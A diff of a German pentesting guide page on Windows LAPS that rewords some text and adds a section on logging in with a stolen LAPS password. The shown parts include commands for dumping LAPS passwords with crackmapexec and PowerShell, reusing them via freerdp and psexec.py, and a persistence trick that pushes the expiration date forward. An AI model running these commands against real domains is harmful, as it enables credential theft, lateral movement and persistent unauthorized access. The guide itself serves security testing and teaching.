@@ -41,7 +41,7 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS Passwortzugriff
 
-Sie könnten **die rohe LAPS-Richtlinie herunterladen** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.
+Sie könnten **die rohe LAPS-Richtlinie** von `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` herunterladen und dann **`Parse-PolFile`** aus dem [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) Paket verwenden, um diese Datei in ein menschenlesbares Format zu konvertieren.
 
 Darüber hinaus können die **nativ LAPS PowerShell-Cmdlets** verwendet werden, wenn sie auf einem Rechner installiert sind, auf den wir Zugriff haben:
 ```powershell
@@ -100,18 +100,26 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Dumping LAPS-Passwörter mit Crackmapexec**
+## **Dumping LAPS Passwords With Crackmapexec**
 Wenn kein Zugriff auf PowerShell besteht, können Sie dieses Privileg remote über LDAP ausnutzen, indem Sie
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
 Dies wird alle Passwörter ausgeben, die der Benutzer lesen kann, sodass Sie mit einem anderen Benutzer einen besseren Fuß in die Tür bekommen.
 
+## ** Verwendung des LAPS-Passworts **
+```
+freerdp /v:192.168.1.1:3389  /u:Administrator
+Password: 2Z@Ae)7!{9#Cq
+
+python psexec.py Administrator@web.example.com
+Password: 2Z@Ae)7!{9#Cq
+```
 ## **LAPS Persistenz**
 
 ### **Ablaufdatum**
 
-Sobald man Administrator ist, ist es möglich, **die Passwörter zu erhalten** und einen Computer daran zu **hindern**, sein **Passwort** zu **aktualisieren**, indem man **das Ablaufdatum in die Zukunft setzt**.
+Sobald man Admin ist, ist es möglich, die **Passwörter** zu **erhalten** und einen Computer daran zu **hindern**, sein **Passwort** zu **aktualisieren**, indem man das Ablaufdatum in die Zukunft setzt.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
